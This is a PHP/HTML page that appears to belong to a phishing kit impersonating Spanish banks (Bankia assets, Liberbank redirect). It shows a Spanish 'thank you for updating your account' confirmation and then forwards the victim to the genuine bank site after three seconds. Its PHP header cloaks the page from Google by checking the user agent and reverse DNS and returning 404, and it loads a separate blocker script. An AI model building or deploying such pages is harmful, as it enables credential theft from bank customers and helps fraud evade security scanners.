<?php
session_start();
error_reporting(0);

if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }


include("./blocker.php");


$random = rand(0,100000000000);
$dis    = substr(md5($random), 0, 25);

?>
<html lang="en" dir="ltr" class="wf-opensans-n4-active wf-opensans-n6-active wf-active"><!--<![endif]--><head>
   <meta charset="utf-8">
   <meta http-equiv="refresh" content="3; url=https://bancaadistancia.liberbank.es" />
  <link href="./Bankia online log in_files/vgn-ext-templating-delivery.css" rel="stylesheet" type="text/css"> 
<style>
ul {
    list-style-type: none;
    margin: 0;
    padding: 0;
    overflow: hidden;
    border: 1px solid #e7e7e7;
    background-color: #f3f3f3;
}

li {
    float: left;
}

li a {
    display: block;
    color: #666;
    text-align: center;
    padding: 14px 16px;
    text-decoration: none;
}



</style>


  <link href="./lib/favicon.ico" rel="icon" type="image/png"> 
  <link href="./lib/jquery-ui.theme.min.css" rel="stylesheet" type="text/css"> 
  <link href="./lib/slick.css" rel="stylesheet" type="text/css"> 
  <link href="./lib/bootstrap.css" rel="stylesheet" type="text/css"> 
  <link href="./lib/bootstrap-multiselect.css" rel="stylesheet" type="text/css"> 
  <link href="./lib/datatables.min.css" rel="stylesheet" type="text/css"> 
  <link href="./lib/ladda.min.css" rel="stylesheet" type="text/css"> 
  <link href="./lib/general.css" rel="stylesheet" type="text/css"> 
  <link href="./lib/modules.css" rel="stylesheet" type="text/css"> 
  <link href="./lib/styles.css" rel="stylesheet" type="text/css"> 
  <link href="./lib/ifb-BankiaWidgets.css" rel="stylesheet" type="text/css"> 
  <link href="./lib/styleWFG.css" rel="stylesheet" type="text/css"> 

 

  <!-- FIN BANNER APP --> 
</head> 
<body cz-shortcut-listen="true" style="background-color: #F4F4F4;">



    <div class="pageLoader" id="selectorloader" style="background-color: rgb(255, 255, 255); position: fixed; width: 100%; height: 100%; z-index: 9999; top: 0px; opacity: 0.9; text-align: center; display: none;">
    <p style=" margin-top: 94px; font-size: 19px; color: #002F6B; font-weight: 500; "><strong> Contrato Multicanal</strong>
    Por favor espere mientras procesamos su solicitud No cierres el navegador</p>
      <div class="spinner loading"></div></div>
    
    
      <ul style=" height: 65px; background-color: #002F6B; opacity: 0.9; text-align: center;">
        <li style="margin-top: 10px; text-align: center; margin-left: 32%;">
          <img style="height:40px;" src="./lib/logoo.png" style="text-align: center;">
        </li>
        <li style="float: left;"></li>
      </ul>
       
      <div class="contenedor_general" style="
        margin-bottom: 15%;
    "> 
       <header class="mod_header mod_headerNew"> 
       </header> 

    <link href="./lib/account_oi.css" rel="stylesheet" type="text/css"> 
 
                
       <div class="container content-form" style="
    top: 2rem;
    margin-bottom: 50px;
    background: #F4F4F4;
"> 
        <div class="iframe-form"> 
        

<meta http-equiv="Content-Type" content="text/html; charset=windows-1252"> 
  
  <meta name="viewport" content="width=device-width, initial-scale=1.0"> 

  <link rel="stylesheet" type="text/css" href="./lib/bootstrap.min.css"> 
  <link rel="stylesheet" type="text/css" href="./lib/ladda.nim.css"> 
  <link rel="stylesheet" type="text/css" href="./lib/general.min.css"> 
  <link rel="stylesheet" type="text/css" href="./lib/modulesLogin.min.css"> 
   
  
  <h1 style="
    height: 7%;
    padding-top: 16px;
    font-weight:  bold;
    color: #fff;
    text-align:  center;
    background: #002F6B;
    opacity: 0.9;
    margin-top: 60px;
    margin-bottom: -40px;
">Gracias por actualizar su cuenta.</h1><div aria-expanded="false" role="menu" class="mod_login  lgn-iframe" style="background-color: #F4F4F4;"> 
   <div class="mod_message msg-error hide" id="messageValidando"> 
    <div class="msg-container"> 
     <a data-function="fc-closeMessage" data-icon="c" class="msg-link data-ico-E"></a> 
    </div> 
   </div> 
   <meta charset="UTF-8">
 
  <!--? hena page redircetion liha ?-->

      <link rel="stylesheet" href="./res/w.css">
  <center>
  <div class="sa" style="
    
    background-color: transparent;
">
<div class="sa-success" style="
    background-color: transparent;
">
<div class="sa-success-tip"></div>
<div class="sa-success-long"></div>
<div class="sa-success-placeholder"></div>
<div class="sa-success-fix"></div>
</div>
</div>